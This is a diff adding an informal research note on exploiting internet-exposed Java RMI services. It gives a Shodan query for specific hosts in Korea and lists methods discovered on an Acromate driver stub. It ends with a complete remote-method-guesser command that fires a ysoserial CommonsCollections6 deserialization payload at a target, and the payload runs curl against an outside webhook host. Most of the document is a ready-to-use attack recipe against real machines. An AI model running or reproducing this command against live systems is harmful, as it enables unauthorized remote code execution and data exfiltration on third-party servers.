@@ -1,0 +1,21 @@
+ok rmi, java and unserialize stuff are cool after all, it took time to enjoy.. (thx amine :) )
+
+most of 1099 port exposed on the internet expose jmxrmi, the exploitation is straightforward with beanshooter https://github.com/qtc-de/beanshooter, but what if there isn't...
+
+and here we are, looking for methods in random package with rmg https://github.com/qtc-de/remote-method-guesser on rmi exposed on internet
+
+https://www.shodan.io/search?query=http.html_hash%3A516997337 (only few hosts on korea)
+
+IDataObject
+com.acromate.driver.core.DataObjectImpl_Stub
+
+method discovered :
+String register(String dummy, String dummy2)
+String login(String dummy, String dummy2)
+String logout(String dummy)
+
+
+java -jar rmg-5.1.0-jar-with-dependencies.jar serialxxx 1099 CommonsCollections6 'curl -X POST http://webhook.site/xx/' --signature 'String register(String dummy, String dummy2)' --bound-name IDataObject --yso /root/Desktop/yso/ysoserial-all.jar
+
+
+
